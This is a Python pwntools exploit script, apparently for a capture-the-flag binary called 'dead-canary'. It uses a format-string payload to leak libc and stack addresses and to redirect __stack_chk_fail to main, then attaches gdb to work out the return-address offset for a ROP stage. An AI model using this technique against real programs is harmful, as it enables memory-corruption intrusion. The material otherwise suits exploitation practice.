#!/usr/bin/python3

from pwn import *

binary = ELF('./dead-canary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.update(arch='amd64',os='linux')
binary.symbols['main'] = 0x400737

rop = ROP([binary])
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

offset = 6
libcoffset = 41
stackoffset = 43

p = process(binary.path)

# first pass, inf. retries if we blow out canary, leak libc, leak stack
payload  = b'%' + str(libcoffset).encode().rjust(2,b'0') + b'$018p'
payload += b'%' + str(stackoffset).encode().rjust(2,b'0') + b'$018p'
payload += fmtstr_payload(offset+2,{binary.got['__stack_chk_fail']:binary.symbols['main']},numbwritten=2*18)
payload += ((0x118 - 0x10 + 1) - len(payload)) * b'A'
p.sendafter('name: ',payload)
p.recvuntil('Hello ')
_ = p.recv(18)
__libc_start_main = int(_,16) - 231
log.info('__libc_start_main: ' + hex(__libc_start_main))
baselibc = __libc_start_main - libc.symbols['__libc_start_main']
log.info('baselibc: ' + hex(baselibc))
libc.address = baselibc
_ = p.recv(18)
stack = int(_,16)
log.info('stack: ' + hex(stack))

# gdb to pid while waiting for 'name:'
d = process(['gdb',binary.path,'-p',str(p.pid)])
d.sendlineafter('gdb) ','b *0x004007dc') # just before last printf
d.sendlineafter('gdb) ','continue')

p.sendlineafter('name: ','foobar')

# should be at break
d.sendlineafter('gdb) ','p/x $rbp')
_ = d.recvline().strip().split()[-1]
rbp = int(_,16)

print('\nreturnoffset:',hex(stack - (rbp + 8)),'\n')
